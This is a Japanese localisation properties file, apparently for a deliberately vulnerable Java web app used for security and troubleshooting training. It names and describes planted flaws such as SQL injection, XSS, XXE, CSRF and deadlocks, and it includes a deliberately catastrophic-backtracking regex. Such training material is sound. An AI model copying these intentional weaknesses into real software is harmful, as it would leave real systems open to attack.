
description.access.history          = \u3053\u306E\u30DA\u30FC\u30B8\u306E\u30A2\u30AF\u30BB\u30B9\u5C65\u6B74 (\u6700\u65B0\u306E15\u4EF6)
description.access.status           = IP\u30A2\u30C9\u30EC\u30B9\u5358\u4F4D\u306E\u30A2\u30AF\u30BB\u30B9\u72B6\u6CC1
description.all                     = \u8B66\u544A\uFF1A\u4E00\u90E8\u306E\u30EA\u30F3\u30AF\u306F\u91CD\u5927\u306A\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u3084CPU\u4F7F\u7528\u7387\u306E\u4E0A\u6607\u3092\u5F15\u304D\u8D77\u3053\u3057\u307E\u3059\u3002\u3053\u308C\u306B\u3088\u308A\u30B3\u30F3\u30D4\u30E5\u30FC\u30BF\u306E\u52D5\u4F5C\u304C\u4E0D\u5B89\u5B9A\u306B\u306A\u308B\u53EF\u80FD\u6027\u304C\u3042\u308A\u307E\u3059\u3002\u7D50\u679C\u306FJRE\u306E\u7A2E\u985E/\u30D0\u30FC\u30B8\u30E7\u30F3\u3001JVM\u30AA\u30D7\u30B7\u30E7\u30F3\u3001OS\u3001\u30CF\u30FC\u30C9\u30A6\u30A7\u30A2\uFF08\u30E1\u30E2\u30EA\u3084CPU\uFF09\u306A\u3069\u306B\u3088\u3063\u3066\u5909\u308F\u308B\u3053\u3068\u304C\u3042\u308A\u307E\u3059\u3002
description.capitalize.string       = \u6587\u5B57\u5217\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u5148\u982D\u3092\u5927\u6587\u5B57\u306B\u3057\u3066\u8868\u793A\u3057\u307E\u3059\u3002\u4F8B) capitalize string -> Capitalize String
description.design.page             = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u3001\u30C7\u30B6\u30A4\u30F3\u306E\u5FAE\u8ABF\u6574\u3092\u3059\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002\u4EE5\u4E0B\u306E\u3044\u305A\u308C\u304B\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3066\u3001\u3053\u306E\u30DA\u30FC\u30B8\u3092\u304A\u597D\u307F\u306E\u30B9\u30BF\u30A4\u30EB\u306B\u5909\u66F4\u3057\u3066\u4E0B\u3055\u3044\u3002
description.design.test             = \u4EE5\u4E0B\u306E\u3044\u305A\u308C\u304B\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3066\u4E0B\u3055\u3044\u3002
description.endless.waiting         = \u6587\u5B57\u6570\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u305D\u306E\u6587\u5B57\u6570\u5206\u306Eecho\u3092\u5B9F\u884C\u3059\u308B\u30D0\u30C3\u30C1\u3092\u4F5C\u6210\u3001\u5B9F\u884C\u3057\u307E\u3059\u3002
description.errors                  = OutOfMemoryError\u3001StackOverflowError\u3001NoClassDefFoundError\u306A\u3069
description.parse.json              = JSON\u6587\u5B57\u5217\u3092\u5165\u529B\u3059\u308B\u3068\u3001JavaScript\u306EJSON.parse()\u3067\u691C\u8A3C\u3057\u305F\u7D50\u679C\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002
description.performance.issue       = \u6027\u80FD\u306B\u95A2\u3059\u308B\u554F\u984C
description.random.string.generator = \u6587\u5B57\u6570\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u305D\u306E\u6587\u5B57\u6570\u5206\u306E\u30E9\u30F3\u30C0\u30E0\u306A\u6587\u5B57\u5217\u3092\u751F\u6210\u3057\u307E\u3059\u3002
description.response.time           = \u30AF\u30A8\u30EA\u6587\u5B57\u5217\u306Bpingurl=[\u4EFB\u610FURL]\u3092\u8FFD\u52A0\u3059\u308B\u3068\u3001\u305D\u306EURL\u304B\u3089\u306E\u5FDC\u7B54\u30B3\u30FC\u30C9\u3068\u6642\u9593\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002
description.reverse.string          = \u6587\u5B57\u5217\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6587\u5B57\u5217\u304C\u9006\u8EE2\u3057\u3066\u8868\u793A\u3055\u308C\u307E\u3059\u3002
description.section.exceptions      = java.lang.RuntimeException\u304B\u3089\u7D99\u627F\u3057\u305F\u4F8B\u5916
description.send.mail               = \u30B5\u30A4\u30C8\u306E\u7BA1\u7406\u8005\u306B\u30E1\u30FC\u30EB\u3092\u9001\u4FE1\u3067\u304D\u307E\u3059\u3002
description.test.regular.expression = \u6B63\u898F\u8868\u73FE<code>^([a-z0-9]+[-]{0,1}){1,100}$</code>\u306B\u4E00\u81F4\u3059\u308B\u6587\u5B57\u5217\u304B\u30C6\u30B9\u30C8\u3057\u3066\u4E0B\u3055\u3044\u3002
description.thread.dump             = \u30B9\u30EC\u30C3\u30C9\u30C0\u30F3\u30D7\u306F\u6B21\u306E\u3068\u304A\u308A\u3067\u3059\u3002
description.troubles                = \u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u3001\u7121\u9650\u30EB\u30FC\u30D7\u3001\u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u306A\u3069
description.vulnerabilities         = XSS\u3001SQL\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u3001LDAP\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306A\u3069

function.description.brute.force                      = \u3053\u306E\u30ED\u30B0\u30A4\u30F3\u30DA\u30FC\u30B8\u306B\u306F\u30A2\u30AB\u30A6\u30F3\u30C8\u30ED\u30C3\u30AF\u304C\u7121\u3044\u305F\u3081\u3001\u30D6\u30EB\u30FC\u30C8\u30D5\u30A9\u30FC\u30B9\u653B\u6483\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.clickjacking                     = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u5909\u66F4\u30DA\u30FC\u30B8\u306B\u306F\u30AF\u30EA\u30C3\u30AF\u30B8\u30E3\u30C3\u30AD\u30F3\u30B0\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.code.injection                   = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u30B3\u30FC\u30C9\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.csrf                             = \u30D1\u30B9\u30EF\u30FC\u30C9\u5909\u66F4\u30DA\u30FC\u30B8\u306B\u306FCSRF\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.cssinjection                     = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FCSS\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.dangerous.file.inclusion         = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u5916\u90E8\u306E\u5371\u967A\u306A\u30D5\u30A1\u30A4\u30EB\u3092\u30A4\u30F3\u30AF\u30EB\u30FC\u30C9\u53EF\u80FD\u3067\u3059\u3002
function.description.database.connection.leak         = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001\u30C7\u30FC\u30BF\u30D9\u30FC\u30B9\u30B3\u30CD\u30AF\u30B7\u30E7\u30F3\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.dead.lock                        = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF(Java)\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.dead.lock2                       = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF(SQL)\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.ei.error                         = \u3053\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068\u3001\u521D\u56DE\u306FExceptionInInitializerError\u304C\u3001\u305D\u306E\u5F8C\u306FNoClassDefFoundError\u304C\u30B9\u30ED\u30FC\u3055\u308C\u307E\u3059\u3002
function.description.endless.waiting.process          = \u5B8C\u4E86\u3057\u306A\u3044\u30D7\u30ED\u30BB\u30B9\u306E\u5F85\u6A5F\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.file.descriptor.leak             = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001\u30D5\u30A1\u30A4\u30EB\u30C7\u30A3\u30B9\u30AF\u30EA\u30D7\u30BF\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.forward.loop                     = \u3053\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068\u3001\u30D5\u30A9\u30EF\u30FC\u30C9\u30EB\u30FC\u30D7\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.infinite.loop                    = \u3053\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068\u3001\u7121\u9650\u30EB\u30FC\u30D7\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.int.overflow                     = \u6574\u6570\u30AA\u30FC\u30D0\u30FC\u30D5\u30ED\u30FC\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.jvm.crash.eav                    = \u3053\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068JVM\u304C\u30AF\u30E9\u30C3\u30B7\u30E5\u3057\u307E\u3059\u3002
function.description.ldap.injection                   = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FLDAP\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.live.lock                        = \u30E9\u30A4\u30D6\u30ED\u30C3\u30AF(Java)\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.loss.of.trailing.digits          = \u60C5\u5831\u843D\u3061\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.mail.header.injection            = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u30E1\u30FC\u30EB\u30D8\u30C3\u30C0\u30FC\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.memory.leak                      = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001Java\u30D2\u30FC\u30D7\u9818\u57DF\u306E\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.memory.leak2                     = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001{0}\u306E\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.memory.leak3                     = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001C\u30D2\u30FC\u30D7\u9818\u57DF\u306E\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.mojibake                         = \u7279\u5B9A\u306E\u6587\u5B57\u5217\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6587\u5B57\u5316\u3051\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.network.socket.leak              = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001\u30CD\u30C3\u30C8\u30EF\u30FC\u30AF\u30BD\u30B1\u30C3\u30C8\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.null.byte.injection              = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FNull\u30D0\u30A4\u30C8\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.open.redirect                    = \u3053\u306E\u30ED\u30B0\u30A4\u30F3\u30DA\u30FC\u30B8\u306B\u306F\u30AA\u30FC\u30D7\u30F3\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.os.command.injection             = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FOS\u30B3\u30DE\u30F3\u30C9\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.path.traversal                   = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u30D1\u30B9\u30C8\u30E9\u30D0\u30FC\u30B5\u30EB\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.redirect.loop                    = \u3053\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068\u3001\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u30EB\u30FC\u30D7\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.round.off.error                  = \u4E38\u3081\u8AA4\u5DEE\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.session.fixation                 = \u3053\u306E\u30ED\u30B0\u30A4\u30F3\u30DA\u30FC\u30B8\u306B\u306F\u30BB\u30C3\u30B7\u30E7\u30F3\u56FA\u5B9A\u653B\u6483\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.slow.regular.expression          = \u7279\u5B9A\u306E\u6587\u5B57\u5217\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6B63\u898F\u8868\u73FE\u306E\u89E3\u6790\u306B\u6642\u9593\u304C\u304B\u304B\u308A\u307E\u3059\u3002
function.description.slow.string.plus.operation       = \u5927\u304D\u306A\u6587\u5B57\u6570\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6587\u5B57\u5217\u9023\u7D50\u306B\u6642\u9593\u304C\u304B\u304B\u308A\u307E\u3059\u3002
function.description.slow.unnecessary.object.creation = \u5927\u304D\u306A\u6570\u5024\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u4E0D\u5FC5\u8981\u306A\u30AA\u30D6\u30B8\u30A7\u30AF\u30C8\u751F\u6210\u306B\u3088\u308A\u3001\u5FDC\u7B54\u6642\u306B\u6642\u9593\u304C\u304B\u304B\u308A\u307E\u3059\u3002
function.description.sql.injection                    = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FSQL\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.thread.leak                      = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u30ED\u30FC\u30C9\u3059\u308B\u305F\u3073\u306B\u3001\u30B9\u30EC\u30C3\u30C9\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
function.description.thread.starvation                = \u30B9\u30EC\u30C3\u30C9\u98E2\u9913\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.thread.unsafe                    = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u3001\u30B9\u30EC\u30C3\u30C9\u30BB\u30FC\u30D5\u3067\u306F\u306A\u3044\u30AF\u30E9\u30B9\u304C\u4F7F\u7528\u3055\u308C\u3066\u3044\u307E\u3059\u3002
function.description.throwable                        = \u3053\u306E\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068\u3001{0}\u304C\u30B9\u30ED\u30FC\u3055\u308C\u307E\u3059\u3002
function.description.truncation.error                 = \u6253\u3061\u5207\u308A\u8AA4\u5DEE\u3092\u767A\u751F\u3055\u305B\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
function.description.unintended.file.disclosure       = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u610F\u56F3\u3057\u306A\u3044\u30D5\u30A1\u30A4\u30EB\u516C\u958B\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.unrestricted.ext.upload          = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u30D5\u30A1\u30A4\u30EB\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u306E\u62E1\u5F35\u5B50\u5236\u9650\u304C\u7121\u3044\u305F\u3081\u3001\u30B3\u30FC\u30C9\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u306A\u3069\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.unrestricted.size.upload         = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u30D5\u30A1\u30A4\u30EB\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u306E\u30B5\u30A4\u30BA\u5236\u9650\u304C\u7121\u3044\u305F\u3081\u3001DoS\u653B\u6483\u306A\u3069\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.verbose.error.message            = \u3053\u306E\u30ED\u30B0\u30A4\u30F3\u30DA\u30FC\u30B8\u306E\u30A8\u30E9\u30FC\u30E1\u30C3\u30BB\u30FC\u30B8\u306F\u89AA\u5207\u904E\u304E\u308B\u305F\u3081\u3001ID\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u63A8\u6E2C\u3055\u308C\u308B\u53EF\u80FD\u6027\u304C\u9AD8\u3044\u3067\u3059\u3002
function.description.vulnerabileoidcrp                = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u30ED\u30B0\u30A4\u30F3\u306BOpenID Connect\u3092\u4F7F\u7528\u3057\u3066\u3044\u307E\u3059\u304C\u3001\u691C\u8A3C\u304C\u4E0D\u5341\u5206\u306A\u305F\u3081\u30AA\u30FC\u30D7\u30F3\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.vulnerabileoidcrp2               = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u30ED\u30B0\u30A4\u30F3\u306BOpenID Connect\u3092\u4F7F\u7528\u3057\u3066\u3044\u307E\u3059\u304C\u3001\u691C\u8A3C\u304C\u4E0D\u5341\u5206\u306A\u305F\u3081\u30EA\u30D5\u30A1\u30E9\u30FC\u304B\u3089\u8A8D\u53EF\u30B3\u30FC\u30C9\u304C\u6D41\u51FA\u3057\u307E\u3059\u3002
function.description.vulnerabileoidcrp3               = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u30ED\u30B0\u30A4\u30F3\u306BOpenID Connect\u3092\u4F7F\u7528\u3057\u3066\u3044\u307E\u3059\u304C\u3001\u691C\u8A3C\u304C\u4E0D\u5341\u5206\u306A\u305F\u3081CSRF\u653B\u6483\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.vulnerabileoidcrp4               = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u30ED\u30B0\u30A4\u30F3\u306B\u591A\u8981\u7D20\u8A8D\u8A3C\u3092\u4F7F\u7528\u3057\u3066\u3044\u306A\u3044\u305F\u3081\u3001\u30D1\u30B9\u30EF\u30FC\u30C9\u30EA\u30B9\u30C8\u653B\u6483\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.vulnerabileoidcrp5               = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u30ED\u30B0\u30A4\u30F3\u306B\u30A2\u30AB\u30A6\u30F3\u30C8\u30ED\u30C3\u30AF\u3092\u8A2D\u5B9A\u3057\u3066\u3044\u306A\u3044\u305F\u3081\u3001\u30D6\u30EB\u30FC\u30C8\u30D5\u30A9\u30FC\u30B9\u653B\u6483\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
function.description.weak.reference                   = \u3053\u306E\u30DA\u30FC\u30B8\u3067\u306F\u5F31\u53C2\u7167\u306E\u30AA\u30D6\u30B8\u30A7\u30AF\u30C8\u304C\u4F7F\u7528\u3055\u308C\u3066\u3044\u308B\u305F\u3081\u3001GC\u306B\u56DE\u53CE\u3055\u308C\u305F\u5F8C\u306B\u52D5\u4F5C\u304C\u5909\u308F\u308A\u307E\u3059\u3002
function.description.xee                              = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FXEE\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.xss                              = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FXSS\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.description.xxe                              = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u306FXXE\u306E\u8106\u5F31\u6027\u304C\u3042\u308A\u307E\u3059\u3002
function.name.brute.force                             = \u30D6\u30EB\u30FC\u30C8\u30D5\u30A9\u30FC\u30B9\u653B\u6483\u53EF\u80FD\u306A\u30ED\u30B0\u30A4\u30F3\u753B\u9762
function.name.clickjacking                            = \u30AF\u30EA\u30C3\u30AF\u30B8\u30E3\u30C3\u30AD\u30F3\u30B0
function.name.code.injection                          = \u30B3\u30FC\u30C9\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.csrf                                    = CSRF (\u30AF\u30ED\u30B9\u30B5\u30A4\u30C8\u30EA\u30AF\u30A8\u30B9\u30C8\u30D5\u30A9\u30FC\u30B8\u30A7\u30EA)
function.name.cssinjection                            = CSS\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.dangerous.file.inclusion                = \u5371\u967A\u306A\u30D5\u30A1\u30A4\u30EB\u30A4\u30F3\u30AF\u30EB\u30FC\u30C9
function.name.database.connection.leak                = \u30C7\u30FC\u30BF\u30D9\u30FC\u30B9\u30B3\u30CD\u30AF\u30B7\u30E7\u30F3\u30EA\u30FC\u30AF
function.name.dead.lock                               = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF (Java)
function.name.dead.lock2                              = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF (SQL)
function.name.endless.waiting.process                 = \u5B8C\u4E86\u3057\u306A\u3044\u30D7\u30ED\u30BB\u30B9\u306E\u5F85\u6A5F
function.name.file.descriptor.leak                    = \u30D5\u30A1\u30A4\u30EB\u30C7\u30A3\u30B9\u30AF\u30EA\u30D7\u30BF\u30EA\u30FC\u30AF
function.name.forward.loop                            = \u30D5\u30A9\u30EF\u30FC\u30C9\u30EB\u30FC\u30D7
function.name.infinite.loop                           = \u7121\u9650\u30EB\u30FC\u30D7
function.name.int.overflow                            = \u6574\u6570\u30AA\u30FC\u30D0\u30FC\u30D5\u30ED\u30FC
function.name.jvm.crash.eav                           = JVM\u30AF\u30E9\u30C3\u30B7\u30E5
function.name.ldap.injection                          = LDAP\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.live.lock                               = \u30E9\u30A4\u30D6\u30ED\u30C3\u30AF(Java)
function.name.loss.of.trailing.digits                 = \u60C5\u5831\u843D\u3061
function.name.mail.header.injection                   = \u30E1\u30FC\u30EB\u30D8\u30C3\u30C0\u30FC\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.memory.leak                             = \u30E1\u30E2\u30EA\u30EA\u30FC\u30AF (Java\u30D2\u30FC\u30D7\u9818\u57DF)
function.name.memory.leak2                            = \u30E1\u30E2\u30EA\u30EA\u30FC\u30AF ({0})
function.name.memory.leak3                            = \u30E1\u30E2\u30EA\u30EA\u30FC\u30AF (C\u30D2\u30FC\u30D7\u9818\u57DF)
function.name.mojibake                                = \u6587\u5B57\u5316\u3051
function.name.network.socket.leak                     = \u30CD\u30C3\u30C8\u30EF\u30FC\u30AF\u30BD\u30B1\u30C3\u30C8\u30EA\u30FC\u30AF
function.name.null.byte.injection                     = Null\u30D0\u30A4\u30C8\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.open.redirect                           = \u30AA\u30FC\u30D7\u30F3\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u53EF\u80FD\u306A\u30ED\u30B0\u30A4\u30F3\u753B\u9762
function.name.os.command.injection                    = OS\u30B3\u30DE\u30F3\u30C9\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.path.traversal                          = \u30D1\u30B9\u30C8\u30E9\u30D0\u30FC\u30B5\u30EB
function.name.redirect.loop                           = \u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u30EB\u30FC\u30D7
function.name.round.off.error                         = \u4E38\u3081\u8AA4\u5DEE
function.name.session.fixation                        = \u30BB\u30C3\u30B7\u30E7\u30F3\u56FA\u5B9A\u653B\u6483\u53EF\u80FD\u306A\u30ED\u30B0\u30A4\u30F3\u753B\u9762
function.name.slow.regular.expression                 = \u6B63\u898F\u8868\u73FE\u89E3\u6790\u306B\u3088\u308B\u9045\u5EF6
function.name.slow.string.plus.operation              = \u30D7\u30E9\u30B9\u6F14\u7B97\u5B50\u306B\u3088\u308B\u6587\u5B57\u5217\u7D50\u5408\u306E\u9045\u5EF6
function.name.slow.unnecessary.object.creation        = \u4E0D\u5FC5\u8981\u306A\u30AA\u30D6\u30B8\u30A7\u30AF\u30C8\u751F\u6210\u306B\u3088\u308B\u9045\u5EF6
function.name.sql.injection                           = SQL\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3
function.name.thread.leak                             = \u30B9\u30EC\u30C3\u30C9\u30EA\u30FC\u30AF
function.name.thread.starvation                       = \u30B9\u30EC\u30C3\u30C9\u98E2\u9913
function.name.thread.unsafe                           = \u30B9\u30EC\u30C3\u30C9\u30BB\u30FC\u30D5\u3067\u306F\u306A\u3044\u30AF\u30E9\u30B9\u306E\u4F7F\u7528
function.name.truncation.error                        = \u6253\u3061\u5207\u308A\u8AA4\u5DEE
function.name.unintended.file.disclosure              = \u610F\u56F3\u3057\u306A\u3044\u30D5\u30A1\u30A4\u30EB\u516C\u958B
function.name.unrestricted.ext.upload                 = \u62E1\u5F35\u5B50\u5236\u9650\u306E\u7121\u3044\u30D5\u30A1\u30A4\u30EB\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9
function.name.unrestricted.size.upload                = \u30B5\u30A4\u30BA\u5236\u9650\u306E\u7121\u3044\u30D5\u30A1\u30A4\u30EB\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9
function.name.verbose.error.message                   = \u89AA\u5207\u904E\u304E\u308B\u8A8D\u8A3C\u30A8\u30E9\u30FC\u30E1\u30C3\u30BB\u30FC\u30B8
function.name.vulnerabileoidcrp                       = OpenID Connect\u5B9F\u88C5\u4E0D\u5099 (\u30AA\u30FC\u30D7\u30F3\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8)
function.name.vulnerabileoidcrp2                      = OpenID Connect\u5B9F\u88C5\u4E0D\u5099 (\u8A8D\u53EF\u30B3\u30FC\u30C9\u6F0F\u6D29)
function.name.vulnerabileoidcrp3                      = OpenID Connect\u5B9F\u88C5\u4E0D\u5099 (CSRF)
function.name.vulnerabileoidcrp4                      = \u30D1\u30B9\u30EF\u30FC\u30C9\u30EA\u30B9\u30C8\u653B\u6483\u53EF\u80FD\u306A\u30ED\u30B0\u30A4\u30F3\u753B\u9762
function.name.vulnerabileoidcrp5                      = \u30D6\u30EB\u30FC\u30C8\u30D5\u30A9\u30FC\u30B9\u653B\u6483\u53EF\u80FD\u306A\u30ED\u30B0\u30A4\u30F3\u753B\u9762 2
function.name.weak.reference                          = \u5F31\u53C2\u7167\u30AA\u30D6\u30B8\u30A7\u30AF\u30C8\u306E\u4F7F\u7528
function.name.xee                                     = XEE (XML\u30A8\u30F3\u30C6\u30A3\u30C6\u30A3\u62E1\u5F35)
function.name.xss                                     = XSS (\u30AF\u30ED\u30B9\u30B5\u30A4\u30C8\u30B9\u30AF\u30EA\u30D7\u30C6\u30A3\u30F3\u30B0)
function.name.xxe                                     = XXE (XML\u5916\u90E8\u30A8\u30F3\u30C6\u30A3\u30C6\u30A3)

label.access.number           = \u30A2\u30AF\u30BB\u30B9\u56DE\u6570
label.access.time             = \u30A2\u30AF\u30BB\u30B9\u6642\u523B
label.attach.file             = \u6DFB\u4ED8\u30D5\u30A1\u30A4\u30EB
label.attribute.name          = \u5C5E\u6027\u540D
label.attribute.value         = \u5C5E\u6027\u5024
label.available.characters    = \u5229\u7528\u53EF\u80FD\u306A\u6587\u5B57
label.browser                 = \u30D6\u30E9\u30A6\u30B6
label.calculate               = \u8A08\u7B97\u3059\u308B
label.capitalized.string      = \u5148\u982D\u3092\u5927\u6587\u5B57\u306B\u3057\u305F\u6587\u5B57\u5217
label.change                  = \u5909\u66F4\u3059\u308B
label.character.count         = \u6587\u5B57\u6570
label.code                    = \u30B3\u30FC\u30C9
label.content                 = \u672C\u6587
